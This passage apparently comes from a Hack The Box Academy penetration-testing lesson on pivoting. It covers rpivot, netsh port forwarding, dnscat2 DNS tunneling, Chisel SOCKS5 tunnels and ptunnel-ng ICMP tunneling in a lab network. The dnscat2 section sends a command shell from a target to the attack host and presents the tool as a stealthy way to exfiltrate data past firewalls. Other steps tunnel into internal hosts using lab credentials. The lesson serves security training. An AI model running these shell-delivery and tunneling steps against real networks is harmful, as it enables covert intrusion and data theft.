<pre><code class="lang-shell-session">root@htb[/htb]$ python2<span class="hljs-number">.7</span> server.py --proxy-port <span class="hljs-number">9050</span> --server-port <span class="hljs-number">9999</span> --server-ip <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
</code></pre>
<p>Before running <code>client.py</code> we will need to transfer rpivot to the target. We can do this using this SCP command:</p>
<p><strong>Transfering rpivot to the Target</strong></p>
<p>Web Server Pivoting with Rpivot</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home</span><span class="hljs-regexp">/ubuntu/</span>
</code></pre>
<p><strong>Running client.py from Pivot Target</strong></p>
<p>Web Server Pivoting with Rpivot</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">ubuntu@WEB01:</span>~/rpivot$ python2<span class="hljs-meta">.7</span> client.py --server-<span class="hljs-built_in">ip</span> <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.18</span> --server-port <span class="hljs-number">9999</span>

Backconnecting to server <span class="hljs-number">10.10</span><span class="hljs-meta">.14</span><span class="hljs-meta">.18</span> port <span class="hljs-number">9999</span>
</code></pre>
<p><strong>Confirming Connection is Established</strong></p>
<p>Web Server Pivoting with Rpivot</p>
<pre><code class="lang-shell-session">New connection from host <span class="hljs-number">10.129</span><span class="hljs-number">.202</span><span class="hljs-number">.64</span>, source port <span class="hljs-number">35226</span>
</code></pre>
<p>We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.</p>
<p>Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.</p>
<p><strong>Browsing to the Target Webserver using Proxychains</strong></p>
<p>Web Server Pivoting with Rpivot</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">proxychains</span> <span class="hljs-selector-tag">firefox-esr</span> 172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.135</span><span class="hljs-selector-pseudo">:80</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/158/rpivot\_proxychain.png" alt=""></p>
<p>Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have <a href="https://docs.microsoft.com/en-us/openspecs/office\_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a">HTTP-proxy with NTLM authentication</a> configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot&#39;s client.py in the following way:</p>
<p><strong>Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth</strong></p>
<pre><code class="lang-shell-session">python <span class="hljs-keyword">client</span>.py --<span class="hljs-keyword">server</span>-ip &lt;IPaddressofTargetWebServer&gt; --<span class="hljs-keyword">server</span>-port <span class="hljs-number">8080</span> --ntlm-proxy-ip
</code></pre>
<h2 id="port-forwarding-with-windows-netsh">Port Forwarding with Windows Netsh</h2>
<hr>
<p><a href="https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts">Netsh</a> is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use <code>Netsh</code> for:</p>
<ul>
<li><code>Finding routes</code></li>
<li><code>Viewing the firewall configuration</code></li>
<li><code>Adding proxies</code></li>
<li><code>Creating port forwarding rules</code></li>
</ul>
<p>Let&#39;s take an example of the below scenario where our compromised host is a Windows 10-based IT admin&#39;s workstation (<code>10.129.15.150</code>,<code>172.16.5.25</code>). Keep in mind that it is possible on an engagement that we may gain access to an employee&#39;s workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/88.png" alt=""></p>
<p>We can use <code>netsh.exe</code> to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.</p>
<p><strong>Using Netsh.exe to Port Forward</strong></p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\Windows\system32&gt; netsh.exe interface portproxy <span class="hljs-keyword">add</span> v4tov4 listenport=<span class="hljs-number">8080</span> listenaddress=<span class="hljs-number">10.129</span><span class="hljs-meta">.15</span><span class="hljs-meta">.150</span> connectport=<span class="hljs-number">3389</span> connectaddress=<span class="hljs-number">172.16</span><span class="hljs-meta">.5</span><span class="hljs-meta">.25</span>
</code></pre>
<p><strong>Verifying Port Forward</strong></p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Windows</span>\<span class="hljs-selector-tag">system32</span>&gt; <span class="hljs-selector-tag">netsh</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">interface</span> <span class="hljs-selector-tag">portproxy</span> <span class="hljs-selector-tag">show</span> <span class="hljs-selector-tag">v4tov4</span>

<span class="hljs-selector-tag">Listen</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">ipv4</span>:             <span class="hljs-selector-tag">Connect</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">ipv4</span>:

<span class="hljs-selector-tag">Address</span>         <span class="hljs-selector-tag">Port</span>        <span class="hljs-selector-tag">Address</span>         <span class="hljs-selector-tag">Port</span>
<span class="hljs-selector-tag">---------------</span> <span class="hljs-selector-tag">----------</span>  <span class="hljs-selector-tag">---------------</span> <span class="hljs-selector-tag">----------</span>
10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.42</span><span class="hljs-selector-class">.198</span>   8080        172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.25</span>     3389
</code></pre>
<p>After configuring the <code>portproxy</code> on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.</p>
<p><strong>Connecting to the Internal Host through the Port Forward</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/158/netsh\_pivot.png" alt=""></p>
<h2 id="dns-tunneling-with-dnscat2">DNS Tunneling with Dnscat2</h2>
<hr>
<p><a href="https://github.com/iagox86/dnscat2">Dnscat2</a> is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted <code>Command-&amp;-Control</code> (<code>C&amp;C</code> or <code>C2</code>) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.</p>
<hr>
<h3 id="setting-up-using-dnscat2">Setting Up &amp; Using dnscat2</h3>
<p>If dnscat2 is not already set up on our attack host, we can do so using the following commands:</p>
<p><strong>Cloning dnscat2 and Setting Up the Server</strong></p>
<p>DNS Tunneling with Dnscat2</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ git clone https:/</span><span class="hljs-regexp">/github.com/</span>iagox86/dnscat2.git

cd dnscat2<span class="hljs-regexp">/server/</span>
sudo gem install bundler
sudo bundle install
</code></pre>
<p>We can then start the dnscat2 server by executing the dnscat2 file.</p>
<p><strong>Starting the dnscat2 server</strong></p>
<p>DNS Tunneling with Dnscat2</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo ruby dnscat2.rb <span class="hljs-comment">--dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</span>

<span class="hljs-keyword">New</span> window created: <span class="hljs-number">0</span>
dnscat2&gt; <span class="hljs-keyword">New</span> window created: crypto-debug
Welcome <span class="hljs-keyword">to</span> dnscat2! Some documentation may be <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> date.

auto_attach =&gt; <span class="hljs-literal">false</span>
history_size (<span class="hljs-keyword">for</span> <span class="hljs-keyword">new</span> windows) =&gt; <span class="hljs-number">1000</span>
Security policy changed: <span class="hljs-keyword">All</span> connections must be encrypted
<span class="hljs-keyword">New</span> window created: dns1
Starting Dnscat2 DNS server <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">14.18</span>:<span class="hljs-number">53</span>
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere <span class="hljs-keyword">with</span> the following (<span class="hljs-comment">--secret is optional):</span>

  ./dnscat <span class="hljs-comment">--secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local</span>

<span class="hljs-keyword">To</span> talk directly <span class="hljs-keyword">to</span> the server without a domain name, run:

  ./dnscat <span class="hljs-comment">--dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21</span>

<span class="hljs-keyword">Of</span> course, you have <span class="hljs-keyword">to</span> figure <span class="hljs-keyword">out</span> &lt;server&gt; yourself! Clients
will connect directly <span class="hljs-keyword">on</span> UDP <span class="hljs-keyword">port</span> <span class="hljs-number">53</span>.
</code></pre>
<p>After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. We can use the client with the dnscat2 project or use <a href="https://github.com/lukebaggett/dnscat2-powershell">dnscat2-powershell</a>, a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. We can clone the project containing the client file to our attack host, then transfer it to the target.</p>
<p><strong>Cloning dnscat2-powershell to the Attack Host</strong></p>
<p>DNS Tunneling with Dnscat2</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/lukebaggett/dnscat2-powershell.git
</code></pre>
<p>Once the <code>dnscat2.ps1</code> file is on the target we can import it and run associated cmd-lets.</p>
<p><strong>Importing dnscat2.ps1</strong></p>
<p>DNS Tunneling with Dnscat2</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\dnscat2.ps1
</code></pre>
<p>After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.</p>
<p>DNS Tunneling with Dnscat2</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">Start-Dnscat2</span> <span class="hljs-selector-tag">-DNSserver</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.18</span> <span class="hljs-selector-tag">-Domain</span> <span class="hljs-selector-tag">inlanefreight</span><span class="hljs-selector-class">.local</span> <span class="hljs-selector-tag">-PreSharedSecret</span> 0<span class="hljs-selector-tag">ec04a91cd1e963f8c03ca499d589d21</span> <span class="hljs-selector-tag">-Exec</span> <span class="hljs-selector-tag">cmd</span>
</code></pre>
<p>We must use the pre-shared secret (<code>-PreSharedSecret</code>) generated on the server to ensure our session is established and encrypted. If all steps are completed successfully, we will see a session established with our server.</p>
<p><strong>Confirming Session Establishment</strong></p>
<p>DNS Tunneling with Dnscat2</p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">New</span> window created: <span class="hljs-number">1</span>
Session <span class="hljs-number">1</span> Security: ENCRYPTED <span class="hljs-keyword">AND</span> VERIFIED!
(the security depends <span class="hljs-keyword">on</span> the strength <span class="hljs-keyword">of</span> your pre-<span class="hljs-keyword">shared</span> secret!)

dnscat2&gt;
</code></pre>
<p>We can list the options we have with dnscat2 by entering <code>?</code> at the prompt.</p>
<p><strong>Listing dnscat2 Options</strong></p>
<p>DNS Tunneling with Dnscat2</p>
<pre><code class="lang-shell-session">dnscat2&gt; ?

Here is a <span class="hljs-keyword">list</span> of commands (<span class="hljs-keyword">use</span> -<span class="hljs-keyword">h</span> <span class="hljs-keyword">on</span> any of them <span class="hljs-keyword">for</span> additional <span class="hljs-keyword">help</span>):
<span class="hljs-comment">* echo</span>
<span class="hljs-comment">* help</span>
<span class="hljs-comment">* kill</span>
<span class="hljs-comment">* quit</span>
<span class="hljs-comment">* set</span>
<span class="hljs-comment">* start</span>
<span class="hljs-comment">* stop</span>
<span class="hljs-comment">* tunnels</span>
<span class="hljs-comment">* unset</span>
<span class="hljs-comment">* window</span>
<span class="hljs-comment">* windows</span>
</code></pre>
<p>We can use dnscat2 to interact with sessions and move further in a target environment on engagements. We will not cover all possibilities with dnscat2 in this module, but it is strongly encouraged to practice with it and maybe even find creative ways to use it on an engagement. Let&#39;s interact with our established session and drop into a shell.</p>
<p><strong>Interacting with the Established Session</strong></p>
<pre><code class="lang-shell-session">dnscat2&gt; window -i <span class="hljs-number">1</span>
<span class="hljs-keyword">New</span> window created: <span class="hljs-number">1</span>
history_size (session) =&gt; <span class="hljs-number">1000</span>
Session <span class="hljs-number">1</span> Security: ENCRYPTED <span class="hljs-keyword">AND</span> VERIFIED!
(the security depends <span class="hljs-keyword">on</span> the strength <span class="hljs-keyword">of</span> your pre-<span class="hljs-keyword">shared</span> secret!)
This <span class="hljs-keyword">is</span> a console session!

That means that anything you <span class="hljs-keyword">type</span> will be sent as-<span class="hljs-keyword">is</span> <span class="hljs-keyword">to</span> the
client, <span class="hljs-keyword">and</span> anything they <span class="hljs-keyword">type</span> will be displayed as-<span class="hljs-keyword">is</span> <span class="hljs-keyword">on</span> the
screen! <span class="hljs-keyword">If</span> the client <span class="hljs-keyword">is</span> executing a command <span class="hljs-keyword">and</span> you don<span class="hljs-symbol">'t</span>
see a prompt, try typing <span class="hljs-symbol">'pwd</span>' <span class="hljs-keyword">or</span> something!

<span class="hljs-keyword">To</span> go back, <span class="hljs-keyword">type</span> ctrl-z.

Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">18363.1801</span>]
(c) <span class="hljs-number">2019</span> Microsoft Corporation. <span class="hljs-keyword">All</span> rights reserved.

C:\Windows\system32&gt;
exec (OFFICEMANAGER) <span class="hljs-number">1</span>&gt;
</code></pre>
<h2 id="socks5-tunneling-with-chisel">SOCKS5 Tunneling with Chisel</h2>
<hr>
<p><a href="https://github.com/jpillora/chisel">Chisel</a> is a TCP/UDP-based tunneling tool written in <a href="https://go.dev/">Go</a> that uses HTTP to transport data that is secured using SSH. <code>Chisel</code> can create a client-server tunnel connection in a firewall restricted environment. Let us consider a scenario where we have to tunnel our traffic to a webserver on the <code>172.16.5.0</code>/<code>23</code> network (internal network). We have the Domain Controller with the address <code>172.16.5.19</code>. This is not directly accessible to our attack host since our attack host and the domain controller belong to different network segments. However, since we have compromised the Ubuntu server, we can start a Chisel server on it that will listen on a specific port and forward our traffic to the internal network through the established tunnel.</p>
<h3 id="setting-up-using-chisel">Setting Up &amp; Using Chisel</h3>
<p>Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:</p>
<p><strong>Cloning Chisel</strong></p>
<p>SOCKS5 Tunneling with Chisel</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/jpillora/chisel.git
</code></pre>
<p>We will need the programming language <code>Go</code> installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use <code>go build</code> to build the Chisel binary.</p>
<p><strong>Building the Chisel Binary</strong></p>
<p>SOCKS5 Tunneling with Chisel</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ cd chisel
go build
</code></pre>
<p>It can be helpful to be mindful of the size of the files we transfer onto targets on our client&#39;s networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf&#39;s blog post &quot;<a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">Tunneling with Chisel and SSF</a>&quot; and IppSec&#39;s walkthrough of the box <code>Reddish</code>. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his <a href="https://www.youtube.com/watch?v=Yp4oxoQIBAM\&amp;t=1469s">video</a>.</p>
<p>Once the binary is built, we can use <code>SCP</code> to transfer it to the target pivot host.</p>
<p><strong>Transferring Chisel Binary to Pivot Host</strong></p>
<p>SOCKS5 Tunneling with Chisel</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ scp chisel ubuntu@<span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.64</span>:~/

ubuntu@<span class="hljs-number">10.129</span><span class="hljs-meta">.202</span><span class="hljs-meta">.64</span><span class="hljs-string">'s password: 
chisel                                        100%   11MB   1.2MB/s   00:09</span>
</code></pre>
<p>Then we can start the Chisel server/listener.</p>
<p><strong>Running the Chisel Server on the Pivot Host</strong></p>
<p>SOCKS5 Tunneling with Chisel</p>
<pre><code class="lang-shell-session">ubuntu<span class="hljs-meta">@WEB</span><span class="hljs-number">01:</span>~$ ./chisel server -v -p <span class="hljs-number">1234</span> --socks5

<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">05</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">25</span> <span class="hljs-string">server:</span> Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">05</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">25</span> <span class="hljs-string">server:</span> Listening on <span class="hljs-string">http:</span><span class="hljs-comment">//0.0.0.0:1234</span>
</code></pre>
<p>The Chisel listener will listen for incoming connections on port <code>1234</code> using SOCKS5 (<code>--socks5</code>) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.</p>
<p>We can start a client on our attack host and connect to the Chisel server.</p>
<p><strong>Connecting to the Chisel Server</strong></p>
<p>SOCKS5 Tunneling with Chisel</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ ./</span>chisel client -v <span class="hljs-number">10.129</span>.<span class="hljs-number">202.64</span>:<span class="hljs-number">1234</span> socks

<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">05</span> <span class="hljs-number">14</span>:<span class="hljs-number">21</span>:<span class="hljs-number">18</span> client: Connecting to ws:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">202.64</span>:<span class="hljs-number">1234</span>
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">05</span> <span class="hljs-number">14</span>:<span class="hljs-number">21</span>:<span class="hljs-number">18</span> client: tun: proxy<span class="hljs-comment">#127.0.0.1:1080=&gt;socks: Listening</span>
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">05</span> <span class="hljs-number">14</span>:<span class="hljs-number">21</span>:<span class="hljs-number">18</span> client: tun: Bound proxies
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">05</span> <span class="hljs-number">14</span>:<span class="hljs-number">21</span>:<span class="hljs-number">19</span> client: Handshaking...
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">05</span> <span class="hljs-number">14</span>:<span class="hljs-number">21</span>:<span class="hljs-number">19</span> client: Sending config
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">05</span> <span class="hljs-number">14</span>:<span class="hljs-number">21</span>:<span class="hljs-number">19</span> client: Connected (Latency <span class="hljs-number">120.170822</span>ms)
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">05</span> <span class="hljs-number">14</span>:<span class="hljs-number">21</span>:<span class="hljs-number">19</span> client: tun: SSH connected
</code></pre>
<p>As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at <code>/etc/proxychains.conf</code> and add <code>1080</code> port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.</p>
<p><strong>Editing &amp; Confirming proxychains.conf</strong></p>
<p>We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using <code>tail</code>.</p>
<p>SOCKS5 Tunneling with Chisel</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ tail -f /etc/proxychains.conf 

<span class="hljs-meta">#</span>
<span class="hljs-meta">#       proxy types: http, socks4, socks5</span>
<span class="hljs-meta">#        ( auth types supported: "basic"-http  "user/pass"-socks )</span>
<span class="hljs-meta">#</span>
[ProxyList]
<span class="hljs-meta"># add proxy here ...</span>
<span class="hljs-meta"># meanwile</span>
<span class="hljs-meta"># defaults set to "tor"</span>
<span class="hljs-meta"># socks4     127.0.0.1 9050</span>
socks5 <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">1080</span>
</code></pre>
<p>Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.</p>
<p><strong>Pivoting to the DC</strong></p>
<p>SOCKS5 Tunneling with Chisel</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ proxychains xfreerdp /</span><span class="hljs-string">v:</span><span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.19</span> <span class="hljs-regexp">/u:victor /</span><span class="hljs-string">p:</span>pass@<span class="hljs-number">123</span>
</code></pre>
<hr>
<h3 id="chisel-reverse-pivot">Chisel Reverse Pivot</h3>
<p>In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.</p>
<p>When the Chisel server has <code>--reverse</code> enabled, remotes can be prefixed with <code>R</code> to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying <code>R:socks</code> will listen on the server&#39;s default socks port (1080) and terminate the connection at the client&#39;s internal SOCKS5 proxy.</p>
<p>We&#39;ll start the server in our attack host with the option <code>--reverse</code>.</p>
<p><strong>Starting the Chisel Server on our Attack Host</strong></p>
<p>SOCKS5 Tunneling with Chisel</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo ./</span>chisel server --reverse -v -p <span class="hljs-number">1234</span> --socks5

<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">30</span> <span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">16</span> <span class="hljs-string">server:</span> Reverse tunnelling enabled
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">30</span> <span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">16</span> <span class="hljs-string">server:</span> Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">30</span> <span class="hljs-number">10</span>:<span class="hljs-number">19</span>:<span class="hljs-number">16</span> <span class="hljs-string">server:</span> Listening on <span class="hljs-string">http:</span><span class="hljs-comment">//0.0.0.0:1234</span>
</code></pre>
<p>Then we connect from the Ubuntu (pivot host) to our attack host, using the option <code>R:socks</code></p>
<p><strong>Connecting the Chisel Client to our Attack Host</strong></p>
<p>SOCKS5 Tunneling with Chisel</p>
<pre><code class="lang-shell-session">ubuntu<span class="hljs-meta">@WEB</span>01$ ./chisel client -v <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.17</span>:<span class="hljs-number">1234</span> <span class="hljs-string">R:</span>socks

<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">30</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span>:<span class="hljs-number">29</span> <span class="hljs-string">client:</span> Connecting to <span class="hljs-string">ws:</span><span class="hljs-comment">//10.10.14.17:1234</span>
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">30</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span>:<span class="hljs-number">29</span> <span class="hljs-string">client:</span> Handshaking...
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">30</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span>:<span class="hljs-number">30</span> <span class="hljs-string">client:</span> Sending config
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">30</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span>:<span class="hljs-number">30</span> <span class="hljs-string">client:</span> Connected (Latency <span class="hljs-number">117.204196</span>ms)
<span class="hljs-number">2022</span><span class="hljs-regexp">/05/</span><span class="hljs-number">30</span> <span class="hljs-number">14</span>:<span class="hljs-number">19</span>:<span class="hljs-number">30</span> <span class="hljs-string">client:</span> <span class="hljs-string">tun:</span> SSH connected
</code></pre>
<p>We can use any editor we would like to edit the proxychains.conf file, then confirm our configuration changes using <code>tail</code>.</p>
<p><strong>Editing &amp; Confirming proxychains.conf</strong></p>
<p>SOCKS5 Tunneling with Chisel</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">9050</span>
socks5 <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">1080</span>
</code></pre>
<p>If we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.</p>
<p>SOCKS5 Tunneling with Chisel</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ proxychains xfreerdp /</span><span class="hljs-string">v:</span><span class="hljs-number">172.16</span><span class="hljs-number">.5</span><span class="hljs-number">.19</span> <span class="hljs-regexp">/u:victor /</span><span class="hljs-string">p:</span>pass@<span class="hljs-number">123</span>
</code></pre>
<h2 id="icmp-tunneling-with-socks">ICMP Tunneling with SOCKS</h2>
<hr>
<p>ICMP tunneling encapsulates your traffic within <code>ICMP packets</code> containing <code>echo requests</code> and <code>responses</code>. ICMP tunneling would only work when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.</p>
<p>We will use the <a href="https://github.com/utoni/ptunnel-ng">ptunnel-ng</a> tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the <code>ptunnel-ng client</code>. We can start the <code>ptunnel-ng server</code> on the target pivot host. Let&#39;s start by setting up ptunnel-ng.</p>
<hr>
<h3 id="setting-up-using-ptunnel-ng">Setting Up &amp; Using ptunnel-ng</h3>
<p>If ptunnel-ng is not on our attack host, we can clone the project using git.</p>
<p><strong>Cloning Ptunnel-ng</strong></p>
<p>ICMP Tunneling with SOCKS</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/utoni/ptunnel-ng.git
</code></pre>
<p>Once the ptunnel-ng repo is cloned to our attack host, we can run the <code>autogen.sh</code> script located at the root of the ptunnel-ng directory.</p>
<p><strong>Building Ptunnel-ng with Autogen.sh</strong></p>
<p>ICMP Tunneling with SOCKS</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo ./autogen.sh
</code></pre>
<p>After running autogen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host. As in previous sections, we can use SCP to transfer the files. If we want to transfer the entire repo and the files contained inside, we will need to use the <code>-r</code> option with SCP.</p>
<p><strong>Transferring Ptunnel-ng to the Pivot Host</strong></p>
<p>ICMP Tunneling with SOCKS</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ scp -r ptunnel-ng ubuntu@<span class="hljs-number">10.129.202.64</span>:~/
</code></pre>
<p>With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.</p>
<p><strong>Starting the ptunnel-ng Server on the Target Host</strong></p>
<p>ICMP Tunneling with SOCKS</p>
<pre><code class="lang-shell-session">ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

[sudo] password for ubuntu: 
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">Starting ptunnel-ng 1.42.</span>
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">(c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;</span>
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">(c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;</span>
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;</span>
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">Forwarding incoming ping packets over TCP.</span>
[<span class="hljs-symbol">inf</span>]: <span class="hljs-link">Ping proxy is listening in privileged mode.</span>
